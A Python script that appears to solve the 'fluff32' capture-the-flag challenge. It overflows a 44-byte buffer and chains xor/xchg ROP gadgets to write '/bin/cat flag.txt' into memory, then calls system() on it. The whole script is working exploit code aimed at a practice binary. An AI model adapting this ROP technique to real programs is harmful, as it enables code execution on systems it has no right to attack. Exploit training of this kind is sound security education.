#!/usr/bin/python

import os
import struct

instruction = "/bin/cat flag.txt\0\0\0"
data_addr = 0x0804a029							#free space
null = struct.pack('<L', 0x00000000)
f = struct.pack('<L', 0xffffffff)				
rop0 = struct.pack('<L', 0x08048693)					#mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
rop1 = struct.pack('<L', 0x08048671)					#xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
rop2 = struct.pack('<L', 0x0804867b)					#xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
rop3 = struct.pack('<L', 0x08048689)					#xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
rop4 = struct.pack('<L', 0x080483e1)					#pop ebx; ret;
syst = struct.pack('<L', 0x08048430)					#system
payload = "A"*44

def set(val, reg):
    chain = rop1 + f + rop4 + struct.pack('<L', val) + rop2 + f  
    if reg == "ECX":							#else is EDX						
        chain += rop3 + f
    return chain
    
for i in range (0, 5):
    value = struct.unpack('<L', instruction[i*4:i*4+4])[0]
    payload += set(data_addr+i*4, "ECX") + set(value, "EDX")
    payload += rop0 + f + null

payload += syst + "BBBB" + struct.pack('<L', data_addr)

fluff = os.popen('./fluff32', 'w')
fluff.write(payload)   
				